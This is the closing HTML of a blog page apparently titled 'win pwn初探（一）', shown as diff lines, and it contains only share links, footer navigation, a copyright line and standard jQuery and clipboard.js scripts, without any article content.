+  <li><a class="icon" href="mailto:?subject=win pwn初探（一）&amp;body=Check out this article: http://example.com/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/&amp;title=win pwn初探（一）"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/&amp;title=win pwn初探（一）"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/&amp;title=win pwn初探（一）"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/&amp;title=win pwn初探（一）"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/&amp;name=win pwn初探（一）&amp;description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/&amp;t=win pwn初探（一）"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright ©
+    
+    
+    2021-2023
+    z1r0
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+
+<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
